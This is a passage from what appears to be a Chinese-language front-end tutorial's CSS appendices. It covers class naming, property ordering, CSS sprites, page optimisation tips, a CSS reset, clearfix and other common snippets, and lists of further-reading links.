<li>搜索：<code>search</code></li>
<li>功能区：<code>shop</code></li>
<li>标题：<code>title</code></li>
<li>加入：<code>joinus</code></li>
<li>状态：<code>status</code></li>
<li>按钮：<code>btn</code></li>
<li>滚动：<code>scroll</code></li>
<li>标签页：<code>tab</code></li>
<li>文章列表：<code>list</code></li>
<li>提示信息：<code>msg</code></li>
<li>当前的:<code>current</code></li>
<li>小技巧：<code>tips</code></li>
<li>图标: <code>icon</code></li>
<li>注释：<code>note</code></li>
<li>指南：<code>guild</code></li>
<li>服务：<code>service</code></li>
<li>热点：<code>hot</code></li>
<li>新闻：<code>news</code></li>
<li>下载：<code>download</code></li>
<li>投票：<code>vote</code></li>
<li>合作伙伴：<code>partner</code></li>
<li>友情链接：<code>link</code></li>
<li>版权：<code>copyright</code></li>
</ul>
</li>
</ul>
<hr />
<ul>
<li>
<p><strong><code>class</code>的命名:</strong></p>
</li>
<li>
<p>颜色:使用颜色的名称或者16进制代码,如</p>
<ul>
<li><code>.red { color: red; }</code></li>
<li><code>.f60 { color: #f60; }</code></li>
<li><code>.ff8600 { color: #ff8600; }</code></li>
</ul>
</li>
<li>
<p>字体大小,直接使用&quot;font+字体大小&quot;作为名称,如</p>
<ul>
<li><code>.font12px { font-size: 12px; }</code></li>
<li><code>.font9px {font-size: 9pt; }</code></li>
</ul>
</li>
<li>
<p>对齐样式,使用对齐目标的英文名称,如</p>
<ul>
<li><code>.left { float:left; }</code></li>
<li><code>.bottom { float:bottom; }</code></li>
</ul>
</li>
<li>
<p>标题栏样式,使用&quot;类别+功能&quot;的方式命名,如</p>
<ul>
<li><code>.barnews { }</code></li>
<li><code>.barproduct { }</code></li>
</ul>
</li>
</ul>
<hr />
<ul>
<li>
<p><strong>注意事项::</strong></p>
<ul>
<li>一律小写;</li>
<li>尽量用英文;</li>
<li>不加中杠和下划线;</li>
<li>尽量不缩写，除非一看就明白的单词.</li>
</ul>
</li>
</ul>
<hr />
</li>
<li>
<p><strong>推荐的 <code>CSS</code> 书写顺序：</strong></p>
<ul>
<li>
<p>显示属性</p>
<ul>
<li><code>display</code></li>
<li><code>list-style</code></li>
<li><code>position</code></li>
<li><code>float</code></li>
<li><code>clear</code></li>
</ul>
</li>
<li>
<p>自身属性</p>
<ul>
<li><code>width</code></li>
<li><code>height</code></li>
<li><code>margin</code></li>
<li><code>padding</code></li>
<li><code>border</code></li>
<li><code>background</code></li>
</ul>
</li>
<li>
<p>文本属性</p>
<ul>
<li><code>color</code></li>
<li><code>font</code></li>
<li><code>text-decoration</code></li>
<li><code>text-align</code></li>
<li><code>vertical-align</code></li>
<li><code>white-space</code></li>
<li><code>other text</code></li>
<li><code>content</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr />
<h4 id="附录二-css精灵"><a class="markdownIt-Anchor" href="#附录二-css精灵"></a> 附录二 CSS精灵</h4>
<hr />
<ul>
<li><strong>CSS精灵原理以及应用</strong>
<ul>
<li><code>CSS</code>雪碧的基本原理是把你的网站上用到的一些图片整合到一张单独的图片中，从而减少你的网站的HTTP请求数量。
<ul>
<li>该图片使用<code>CSS</code>   <code>background和background-position</code>属性渲染，这也就意味着你的标签变得更加复杂了，图片是在<code>CSS</code>中定义，而非<code>&lt;img&gt;</code>标签。</li>
</ul>
</li>
</ul>
</li>
<li><strong>一个简单的例子</strong>：
<ul>
<li>一张图片作出一个按钮的三个状态</li>
<li>一个链接用<code>CSS</code>做成按钮的样式，我们可以使用同一张图片，完成按钮的三个状态，<code>a:link</code>，<code>a:hover</code>，<code>a:active</code> <code>&lt;a class=&quot;button&quot; href=&quot;#&quot;&gt;链接&lt;/a&gt;</code></li>
<li>加入右侧的图片为：<code>200px 65px</code>的三个按钮图拼合而成的图片<code>button.png</code>，从上到下一次为按钮的普通、鼠标滑过、鼠标点击的状态。则可以使用<code>CSS</code>进行定义。</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#123;</span><br><span class="line">    display:block; </span><br><span class="line">    width:200px; </span><br><span class="line">    height:65px; </span><br><span class="line">    line-height:65px; &#x2F;*定义状态*&#x2F;</span><br><span class="line">    text-indent:-2015px; &#x2F;*隐藏文字*&#x2F;</span><br><span class="line">    background-image:url(button.png); &#x2F;*定义背景图片*&#x2F;</span><br><span class="line">    background-position:0 0;</span><br><span class="line">    &#x2F;*定义链接的普通状态，此时图像显示的是顶上的部分*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a:hover &#123;</span><br><span class="line">    background-position:0 -66px;</span><br><span class="line">    &#x2F;*定义链接的滑过状态，此时显示的为中间部分，向下取负值*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">a:active &#123;</span><br><span class="line">    background-position:0 -132px;                      </span><br><span class="line">    &#x2F;*定 义链接的普通状态，此时显示的是底部的部分，向下取负值*&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>更多的<code>CSS</code>雪碧，图片更复杂，背景定位更精确。可能会用到大量的数值
<ul>
<li>如：<code>background:url(nav.png) -180px 24pxno-repeat</code>; 来达到更精确的定位</li>
</ul>
</li>
<li><strong>优点：</strong>
<ul>
<li>减少加载网页图片时对服务器的请求次数</li>
<li>可以合并多数背景图片和小图标，方便在任何位置使用，这样不同位置的请求只需要调用一个图片，从而减少对服务器的请求次数，降低服务器压力，同时提高了页面的加载速度，节约服务器的流量。</li>
<li>提高页面的加载速度</li>
<li><code>sprite</code>技术的其中一个好处是图片的加载时间(在有许多 <code>sprite</code> 时，单张图片的加载时间)。由所需图片拼成的一张 <code>GIF</code>图片的尺寸会明显小于所有图片拼合前的大小。单张的 <code>GIF</code>只有相关的一个色表，而单独分割的每一张 <code>GIF</code> 都有自己的一个色表，这就增加了总体的大小。因此，单独的一张 <code>JPEG</code> 或者 <code>PNG</code> <code>sprite</code> 在大小上非常可能比把一张图分成多张得来的图片总尺寸小。</li>
<li>减少鼠标滑过的一些<code>bug</code></li>
<li><code>IE6</code>不会主动预加载鼠标滑过即<code>a:hover</code>中的背景图片，所以，如果使用多张图片，鼠标滑过会出现闪白的现象。使用<code>CSS</code>雪碧，由于一张图片即可，所以不会出现这种现象。</li>
</ul>
</li>
<li><strong>不足：</strong>
<ul>
<li><code>CSS</code>雪碧的最大问题是内存使用</li>
<li>影响浏览器的缩放功能</li>
<li>拼图维护比较麻烦</li>
<li>使<code>CSS</code>的编写变得困难</li>
<li><code>CSS</code> 雪碧调用的图片不能被打印</li>
<li>错误得使用 <code>Sprites</code> 影响可访问性</li>
</ul>
</li>
</ul>
<h4 id="附录三-一些tips解决方案"><a class="markdownIt-Anchor" href="#附录三-一些tips解决方案"></a> 附录三 一些tips解决方案</h4>
<hr />
<h5 id="页面优化实践"><a class="markdownIt-Anchor" href="#页面优化实践"></a> 页面优化实践</h5>
<hr />
<ul>
<li>
<p>从下面的几个方面可以进行页面的优化：</p>
<ul>
<li>减少请求数</li>
<li>图片合并</li>
<li><code>CSS</code>文件合并</li>
<li>减少内联样式</li>
<li>避免在 <code>CSS</code>中使用 <code>import</code></li>
<li>减少文件大小</li>
<li>选择适合的图片格式</li>
<li>图片压缩</li>
<li><code>CSS</code> 值缩写（<code>Shorthand Property</code>)</li>
<li>文件压缩</li>
<li>页面性能</li>
<li>调整文件加载顺序</li>
<li>减少标签数量</li>
<li>调整选择器长度</li>
<li>尽量使用 <code>CSS</code> 制作显示表现</li>
<li>增强代码可读性与可维护性</li>
<li>规范化</li>
<li>语义化</li>
<li>模块化</li>
</ul>
</li>
</ul>
<h5 id="写divcss-的一些常识"><a class="markdownIt-Anchor" href="#写divcss-的一些常识"></a> 写DIV+CSS 的一些常识</h5>
<hr />
<ul>
<li>
<p>不要使用过小的图片做背景平铺</p>
<ul>
<li>这就是为何很多人都不用 <code>1px</code> 的原因，这才知晓。宽高 <code>1px</code> 的图片平铺出一个宽高 <code>200px</code> 的区域，需要 <code>200200=40, 000</code> 次，占用资源</li>
</ul>
</li>
<li>
<p>无边框</p>
<ul>
<li>推荐的写法是 <code>border:none</code>;，哈哈，我一直在用这个。 <code>border:0;</code> 只是定义边框宽度为零，但边框样式、颜色还是会被浏览器解析，占用资源</li>
</ul>
</li>
<li>
<p>慎用 通配符</p>
<ul>
<li>所谓通配符，就是将 <code>CSS</code> 中的所有标签均初始化，不管用的不用的，过时的先进的，一视同仁，这样，大大的占用资源。要有选择的初始化标签。</li>
</ul>
</li>
<li>
<p><code>CSS</code>的十六进制颜色代码缩写</p>
<ul>
<li>习惯了缩写及小写，这才知道，原来不是推荐的写法，为的是减少解析所占用的资源。但同时会增加文件体积。孰优孰劣，有待仔细考证。</li>
</ul>
</li>
<li>
<p>样式放头上，脚本放脚下。不内嵌，只外链</p>
</li>
<li>
<p>坚决不用 <code>CSS</code>表达式</p>
</li>
<li>
<p>使用 引用样式表，而不是通过 <code>@import</code> 导入。</p>
</li>
<li>
<p>一般来说，<code>PNG</code>比 <code>GIF</code> 要小，小得多。再者，<code>GIF</code> 中有多少颜色是被浪费的，很值得优化。</p>
</li>
<li>
<p>千万不要在 <code>HTML</code>中缩放图片，一者不好看，二者占资源。</p>
</li>
<li>
<p>正文字体最好用偶数</p>
<ul>
<li><code>12px</code>、<code>14px</code>、<code>16px</code>，效果非常好。特例，<code>15px</code>。</li>
</ul>
</li>
<li>
<p><code>block</code>、<code>ul</code>、<code>ol</code>等上下留出至少一倍行距，左侧至少两倍行距，右侧随意。</p>
</li>
<li>
<p>段落之间，至少要有一倍行距</p>
</li>
<li>
<p>强行指定某些元素的 <code>line-height</code>，正文 <code>1.6</code>倍于文字大小，标题<code>1.3</code>倍。</p>
</li>
<li>
<p>中文标点用全角</p>
<ul>
<li>英文夹杂在中文中，左右空格，半角。</li>
</ul>
</li>
<li>
<p>中文字体的粗体和斜体，远离较好</p>
</li>
</ul>
<h5 id="常用代码片段"><a class="markdownIt-Anchor" href="#常用代码片段"></a> 常用代码片段</h5>
<hr />
<ul>
<li>雅虎工程师提供的<code>CSS</code>初始化示例代码【仅供参考】
<ul>
<li>可以在<code>html</code>头文件中直接引用，从而避免浏览器的不兼容带来的错误。</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>,</span><br><span class="line"><span class="selector-tag">div</span>,</span><br><span class="line"><span class="selector-tag">dl</span>,</span><br><span class="line"><span class="selector-tag">dt</span>,</span><br><span class="line"><span class="selector-tag">dd</span>,</span><br><span class="line"><span class="selector-tag">ul</span>,</span><br><span class="line"><span class="selector-tag">ol</span>,</span><br><span class="line"><span class="selector-tag">li</span>,</span><br><span class="line"><span class="selector-tag">h1</span>,</span><br><span class="line"><span class="selector-tag">h2</span>,</span><br><span class="line"><span class="selector-tag">h3</span>,</span><br><span class="line"><span class="selector-tag">h4</span>,</span><br><span class="line"><span class="selector-tag">h5</span>,</span><br><span class="line"><span class="selector-tag">h6</span>,</span><br><span class="line"><span class="selector-tag">pre</span>,</span><br><span class="line"><span class="selector-tag">code</span>,</span><br><span class="line"><span class="selector-tag">form</span>,</span><br><span class="line"><span class="selector-tag">fieldset</span>,</span><br><span class="line"><span class="selector-tag">legend</span>,</span><br><span class="line"><span class="selector-tag">input</span>,</span><br><span class="line"><span class="selector-tag">button</span>,</span><br><span class="line"><span class="selector-tag">textarea</span>,</span><br><span class="line"><span class="selector-tag">p</span>,</span><br><span class="line"><span class="selector-tag">blockquote</span>,</span><br><span class="line"><span class="selector-tag">th</span>,</span><br><span class="line"><span class="selector-tag">td</span> &#123; </span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">0</span>; <span class="attribute">padding</span>:<span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>:<span class="number">#fff</span>; </span><br><span class="line">    <span class="attribute">color</span>:<span class="number">#555</span>; </span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">14px</span>; </span><br><span class="line">    <span class="attribute">font-family</span>: Verdana, Arial, Helvetica, sans-serif; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">td</span>,</span><br><span class="line"><span class="selector-tag">th</span>,</span><br><span class="line"><span class="selector-tag">caption</span> &#123; </span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">14px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span>, </span><br><span class="line"><span class="selector-tag">h2</span>, </span><br><span class="line"><span class="selector-tag">h3</span>, </span><br><span class="line"><span class="selector-tag">h4</span>, </span><br><span class="line"><span class="selector-tag">h5</span>, </span><br><span class="line"><span class="selector-tag">h6</span> &#123; </span><br><span class="line">    <span class="attribute">font-weight</span>:normal; </span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">100%</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">address</span>, </span><br><span class="line"><span class="selector-tag">caption</span>,</span><br><span class="line"><span class="selector-tag">cite</span>, </span><br><span class="line"><span class="selector-tag">code</span>, </span><br><span class="line"><span class="selector-tag">dfn</span>, </span><br><span class="line"><span class="selector-tag">em</span>, </span><br><span class="line"><span class="selector-tag">strong</span>,</span><br><span class="line"><span class="selector-tag">th</span>, </span><br><span class="line"><span class="selector-tag">var</span> &#123; </span><br><span class="line">    <span class="attribute">font-style</span>:normal; </span><br><span class="line">    <span class="attribute">font-weight</span>:normal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span> &#123; </span><br><span class="line">    <span class="attribute">color</span>:<span class="number">#555</span>; </span><br><span class="line">    <span class="attribute">text-decoration</span>:none; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123; </span><br><span class="line">    <span class="attribute">text-decoration</span>:underline; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ol</span>,<span class="selector-tag">ul</span>,<span class="selector-tag">li</span> &#123; </span><br><span class="line">    <span class="attribute">list-style</span>:none; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>, </span><br><span class="line"><span class="selector-tag">textarea</span>, </span><br><span class="line"><span class="selector-tag">select</span>, </span><br><span class="line"><span class="selector-tag">button</span> &#123; </span><br><span class="line">    <span class="attribute">font</span>:<span class="number">14px</span> Verdana,Helvetica,Arial,sans-serif; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">table</span> &#123; </span><br><span class="line">    <span class="attribute">border-collapse</span>:collapse; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">overflow-y</span>: scroll;</span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">"."</span>; </span><br><span class="line">    <span class="attribute">display</span>: block; </span><br><span class="line">    <span class="attribute">height</span>:<span class="number">0</span>; </span><br><span class="line">    <span class="attribute">clear</span>:both; </span><br><span class="line">    <span class="attribute">visibility</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span> &#123; </span><br><span class="line">    *zoom:1; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>mobile meta</code>标签</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">”viewport”</span> <span class="attr">content</span>=<span class="string">”width</span>=<span class="string">320,target-densitydpi</span>=<span class="string">dpi_value,initial-scale</span>=<span class="string">1,</span> <span class="attr">user-scalable</span>=<span class="string">no”/</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>表格不被撑开</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">table-layout</span>: <span class="selector-tag">fixed</span>; <span class="selector-tag">word-break</span>: <span class="selector-tag">break-all</span>;;<span class="selector-tag">border-collapse</span>: <span class="selector-tag">collapse</span></span><br></pre></td></tr></table></figure>
<ul>
<li>不设宽高居中</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">”abc”</span> <span class="attr">style</span>=<span class="string">”display:table;text-align:center;width:100%;height:100%;”</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">”background:#f00;</span> <span class="attr">display:table-cell</span>; <span class="attr">vertical-align:middle</span>;”&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”button”</span> <span class="attr">value</span>=<span class="string">”item1″</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>透明度的兼容代码</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">filter:alpha(opacity=50); /*1-100*/</span><br><span class="line"><span class="selector-tag">-moz-opacity</span><span class="selector-pseudo">:0.5</span>; <span class="comment">/*0-1.0*/</span></span><br><span class="line"><span class="selector-tag">-khtml-opacity</span><span class="selector-pseudo">:0.5</span>; <span class="comment">/*0-1.0*/</span></span><br><span class="line"><span class="selector-tag">opacity</span><span class="selector-pseudo">:0.5</span>; <span class="comment">/*0-1.0*/</span></span><br></pre></td></tr></table></figure>
<ul>
<li>文字溢出点点省略</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">white-space</span><span class="selector-pseudo">:nowrap</span>;</span><br><span class="line"><span class="selector-tag">text-overflow</span><span class="selector-pseudo">:ellipsis</span>;</span><br><span class="line"><span class="selector-tag">overflow</span><span class="selector-pseudo">:hidden</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>清除浮动的几种方法</p>
<ul>
<li>方法一：<code>投机取巧法</code> – 不推荐</li>
<li>直接一个放到当作最后一个子标签放到父标签那儿，此方法屡试不爽，兼容性强</li>
</ul>
</li>
<li>
<p>方法二：<code>overflow + zoom</code>方法  --不推荐<br />
<code>.fix{overflow:hidden; zoom:1;}</code></p>
<ul>
<li>此方法优点在于代码简洁，涵盖所有浏览器</li>
</ul>
</li>
<li>
<p>方法三：<code>after + zoom</code>方法 -推荐–此方法可以说是综合起来最好的方法了</p>
<ul>
<li><code>clearfix</code>只应用在包含浮动子元素的父级元素上</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.fix</span>&#123;<span class="attribute">zoom</span>:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="selector-class">.fix</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">     <span class="attribute">display</span>:block; </span><br><span class="line">     <span class="attribute">content</span>:<span class="string">'clear'</span>; </span><br><span class="line">     <span class="attribute">clear</span>:both;</span><br><span class="line">     <span class="attribute">line-height</span>:<span class="number">0</span>; </span><br><span class="line">     <span class="attribute">visibility</span>:hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>更多代码片段详情
<ul>
<li><a href="http://www.jianshu.com/p/e878122a92a3" target="_blank" rel="noopener">实用的60个CSS代码片段</a></li>
</ul>
</li>
</ul>
<h5 id="一些总结"><a class="markdownIt-Anchor" href="#一些总结"></a> 一些总结</h5>
<hr />
<ul>
<li>
<p>自动继承属性：</p>
<ul>
<li><code>color</code></li>
<li><code>font</code></li>
<li><code>text-align</code></li>
<li><code>list-style</code><br />
…</li>
</ul>
</li>
<li>
<p>非继承属性：</p>
<ul>
<li><code>background</code></li>
<li><code>border</code></li>
<li><code>position</code><br />
…</li>
</ul>
</li>
<li>
<p>具有破坏性的元素：</p>
<ul>
<li><code>float</code></li>
<li><code>display:none;</code></li>
<li><code>position:absoblute/fixed/sticky;</code></li>
</ul>
</li>
<li>
<p>具有包裹性的元素：</p>
<ul>
<li>
<p><code>display:inline-block/table-cell</code></p>
</li>
<li>
<p><code>position:absolute/fixed/sticky</code></p>
</li>
<li>
<p><code>overflow:hidden/scroll</code></p>
</li>
</ul>
</li>
<li>
<p>消除图片底部间隙的方法</p>
<ul>
<li>
<p>图片块状化-无基线对齐<br />
<code>img{display:block;}</code></p>
</li>
<li>
<p>图片底线对齐<br />
<code>img{vertical-align:bottom;}</code></p>
</li>
<li>
<p>行高足够小 - 基线位置上移<br />
<code>.box{line-height:0;}</code></p>
</li>
</ul>
</li>
</ul>
<h5 id="一些概念"><a class="markdownIt-Anchor" href="#一些概念"></a> 一些概念</h5>
<hr />
<ul>
<li>
<p>BFC</p>
<ul>
<li>
<p>BFC全称<code>”Block Formatting Context”</code> 中文为“块级格式化上下文”</p>
</li>
<li>
<p>记住这么一句话：<code>BFC</code>元素特性表现原则就是，内部子元素再怎么翻江倒海，翻云覆雨都不会影响外部的元素</p>
</li>
<li>
<p><code>BFC</code>就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此</p>
</li>
</ul>
</li>
<li>
<p>扩展阅读</p>
<ul>
<li><a href="https://github.com/dwqs/blog/issues/22" target="_blank" rel="noopener">CSS中的BFC</a></li>
</ul>
</li>
<li>
<p>优雅降级(<code>graceful degradation</code>)</p>
<ul>
<li>一开始就构建完整的功能，然后再针对低版本浏览器进行兼容</li>
</ul>
</li>
<li>
<p>渐进增强 <code>progressive enhancement</code>：</p>
<ul>
<li>是在浏览器开启<code>JavaScript</code>功能后，如果浏览器版本不支持某些  <code>JavaScript</code>  能力，我们解决这种问题的方式</li>
</ul>
</li>
<li>
<p>平稳退化</p>
<ul>
<li>是在浏览器没有<code>JavaScript</code>功能，或没有开启<code>JavaScript</code>功能情况下，我们解决这种问题的方式；</li>
</ul>
</li>
</ul>
<h5 id="方案荟萃扩展阅读"><a class="markdownIt-Anchor" href="#方案荟萃扩展阅读"></a> 方案荟萃扩展阅读</h5>
<hr />
<ul>
<li>
<p><strong>关于布局</strong></p>
</li>
<li>
<p><a href="http://www.qianduan.net/css-to-achieve-the-vertical-center-of-the-five-kinds-of-methods/" target="_blank" rel="noopener">垂直居中</a></p>
</li>
<li>
<p><a href="http://codepen.io/shshaw/full/gEiDt" target="_blank" rel="noopener">css完全居中</a></p>
</li>
<li>
<p><a href="http://www.w3cplus.com/collective-5.html" target="_blank" rel="noopener">居中之美</a></p>
</li>
<li>
<p><a href="http://www.zhihu.com/question/35290742#answer-20340542" target="_blank" rel="noopener">网页中的底部foot定位</a></p>
</li>
<li>
<p><a href="http://www.webhek.com/css-100-percent-height" target="_blank" rel="noopener">页面高度100%</a></p>
</li>
<li>
<p><a href="https://github.com/phoetry/textareaAutoHeight" target="_blank" rel="noopener">textarea高度自适应</a></p>
</li>
<li>
<p><a href="http://dotdotdot.frebsite.nl/" target="_blank" rel="noopener">多行溢出省略</a></p>
</li>
<li>
<p><a href="http://jinlong.github.io/2015/05/24/css-retina-hairlines/" target="_blank" rel="noopener">Retina屏1px线</a></p>
</li>
<li>
<p><a href="https://github.com/philipwalton/flexbugs" target="_blank" rel="noopener">Flexbugs</a></p>
</li>
<li>
<p><strong>其他</strong></p>
</li>
<li>
<p><a href="http://www.stepday.com/topic/?690" target="_blank" rel="noopener">IF IE ENDIF条件判断之IE10</a></p>
</li>
<li>
<p><a href="http://www.zhihu.com/question/20158063" target="_blank" rel="noopener">Chrome 翻译插件</a></p>
</li>
<li>
<p><a href="http://blog.netsh.org/posts/website-retina_1779.netsh.html" target="_blank" rel="noopener">网页retina优化</a></p>
</li>
<li>
<p><a href="http://segmentfault.com/a/1190000002407912" target="_blank" rel="noopener">常用meta</a></p>
</li>
<li>
<p><a href="http://www.cnblogs.com/mq0036/p/3531848.html" target="_blank" rel="noopener">树状菜单</a></p>
</li>
<li>
<p><a href="http://www.w3ctrain.com/2015/07/24/comprehensive-guide-when-to-use-em-vs-rem/" target="_blank" rel="noopener">em vs rem</a></p>
</li>
<li>
<p><a href="https://github.com/classicemi/blog/issues/3#issuecomment-113861251" target="_blank" rel="noopener">css vs js</a></p>
</li>
<li>
<p><a href="http://www.w3cplus.com/solution/index/index.html" target="_blank" rel="noopener">css解决方案（w3cplus）</a></p>
</li>
<li>
<p><a href="http://riccardoscalco.github.io/textures/" target="_blank" rel="noopener">Textures生成纹理</a></p>
</li>
<li>
<p><a href="http://una.im/CSSgram/" target="_blank" rel="noopener">CSSgram</a></p>
</li>
<li>
<p><a href="http://zmoazeni.github.io/csscss/" target="_blank" rel="noopener">Csscss（检查重复声明等）</a></p>
</li>
</ul>
<h4 id="附录四-部分工具资源"><a class="markdownIt-Anchor" href="#附录四-部分工具资源"></a> 附录四 部分工具资源</h4>
<hr />
<ul>
<li><a href="http://blog.poetries.top/2016/03/14/Emmet%EF%BC%9AHTML-CSS%E4%BB%A3%E7%A0%81%E5%BF%AB%E9%80%9F%E7%BC%96%E5%86%99%E7%A5%9E%E5%99%A8/" target="_blank" rel="noopener">学会使用Emmet插件快速编码</a></li>
<li><a href="http://blog.poetries.top/2016/09/09/Emmet%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/#more" target="_blank" rel="noopener">Emmet常用快捷键</a></li>
<li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/sublime-text.md" target="_blank" rel="noopener">Sublime专题</a></li>
<li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/Sublime%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%80%BB%E7%BB%93.md" target="_blank" rel="noopener">Sublime常用插件总结</a></li>
<li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/Front-End%20-Develop%20-Tools.md" target="_blank" rel="noopener">Front-End -Develop -Tools</a></li>
<li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/Tools.md" target="_blank" rel="noopener">ToolsBox-自己整理的一份工具列表</a></li>
</ul>
<h4 id="附录五-编码规范"><a class="markdownIt-Anchor" href="#附录五-编码规范"></a> 附录五 编码规范</h4>
<hr />
<ul>
<li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83.md" target="_blank" rel="noopener">编码规范</a></li>
<li><a href="http://front-end-standards.com/" target="_blank" rel="noopener">前端规范</a></li>
<li><a href="https://github.com/poetries/mywiki/wiki/web-develop-standard" target="_blank" rel="noopener">web develop standard</a></li>
<li><a href="http://codecloud.net/5622.html" target="_blank" rel="noopener">Web 前端开发规范文档</a></li>
<li><a href="http://zhibimo.com/read/Ashu/front-end-style-guide/index.html" target="_blank" rel="noopener">前端开发规范手册</a></li>
</ul>
<h4 id="附录六-进阶学习"><a class="markdownIt-Anchor" href="#附录六-进阶学习"></a> 附录六 进阶学习</h4>
<hr />
<ul>
<li><a href="http://www.jianshu.com/p/1e638b7da640" target="_blank" rel="noopener">DOM编程之API学习</a></li>
<li><a href="http://www.jianshu.com/p/1f2314552e23" target="_blank" rel="noopener">JavaScript基础学习</a></li>
</ul>
<h4 id="附录七-其他资源"><a class="markdownIt-Anchor" href="#附录七-其他资源"></a> 附录七 其他资源</h4>
<hr />
<ul>
<li><a href="https://github.com/poetries/mywiki" target="_blank" rel="noopener">Github上前端学习资源汇总</a></li>
<li><a href="https://github.com/poetries/mywiki/tree/master/front-end" target="_blank" rel="noopener">WEB 前端开发学习笔记</a></li>
<li><a href="https://github.com/poetries/mywiki/wiki/%E6%94%B6%E9%9B%86%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7" target="_blank" rel="noopener">前端开发工具箱</a></li>
<li><a href="https://segmentfault.com/a/1190000006689923" target="_blank" rel="noopener">148个资源让你成为CSS专家</a></li>
<li><a href="http://zh.learnlayout.com/" target="_blank" rel="noopener">学习CSS布局-经典必看</a></li>
</ul>
<h4 id="附录八-常见问题"><a class="markdownIt-Anchor" href="#附录八-常见问题"></a> 附录八 常见问题</h4>
<hr />
<ul>
<li>
<p>前端指路</p>
</li>
<li>
<p><a href="http://www.w3cplus.com/css/write-to-front-end-developer-interview.html" target="_blank" rel="noopener">写给前端面试者（w3cplus）</a></p>
</li>
<li>
<p><a href="http://jiongks.name/blog/how-to-become-a-great-front-end-engineer/" target="_blank" rel="noopener">如何成为一名卓越的前端工程师（勾三股四博客）</a></p>
</li>
<li>
<p><a href="http://www.epubit.com.cn/article/144" target="_blank" rel="noopener">什么是全栈工程师</a></p>
</li>
<li>
<p><a href="https://uptodate.frontendrescue.org/zh/" target="_blank" rel="noopener">如何跟上前端开发的最新前沿</a></p>
</li>
<li>
<p><a href="http://blog.jobbole.com/12749/" target="_blank" rel="noopener">浏览器的工作原理</a></p>
</li>
<li>
<p><a href="http://www.zhihu.com/question/20269059#answer-19718763" target="_blank" rel="noopener">移动前端开发和 Web 前端开发的区别</a></p>
</li>
<li>
<p><a href="http://segmentfault.com/q/1010000003723038?utm_source=weekly&amp;utm_medium=email&amp;utm_campaign=email_weekly" target="_blank" rel="noopener">大型网站CSS编写与维护</a></p>
</li>
<li>
<p><a href="http://segmentfault.com/q/1010000003059724" target="_blank" rel="noopener">CSS核心技术关键字</a></p>
</li>
<li>
<p>性能/规范/实践</p>
</li>
<li>
<p><a href="http://www.chinaw3c.org/how-to-read-spec-wxx.html" target="_blank" rel="noopener">如何阅读W3c规范(王晓轩)</a></p>
</li>
<li>
